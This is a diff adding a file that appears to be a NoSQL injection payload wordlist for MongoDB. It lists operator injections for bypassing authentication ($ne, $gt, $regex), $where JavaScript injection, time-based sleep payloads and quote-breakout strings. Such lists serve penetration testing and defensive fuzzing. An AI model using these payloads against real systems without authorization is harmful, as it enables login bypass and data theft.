@@ -1,0 +1,21 @@
+{"$gt": ""}
+{"$ne": ""}
+{"$regex": ".*"}
+{"$where": "1==1"}
+{"$where": "this.password == this.username"}
+{"$exists": true}
+{"$exists": false}
+{"$in": ["admin", "root"]}
+{"$nin": []}
+{"$or": [{"username": "admin"}, {"role": "admin"}]}
+{"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}
+{"username": {"$regex": "^admin"}}
+{"username": {"$regex": "^admin", "$options": "i"}}
+{"$expr": {"$eq": ["$username", "$password"]}}
+true, $where: '1==1'
+'; return true; var a='
+db.collection.find({username: {$ne: ""}})
+{"$where": "sleep(5000)"}
+{"$where": "function(){sleep(5000)}"}
+1 || 1==1
+'; db.users.find(); //
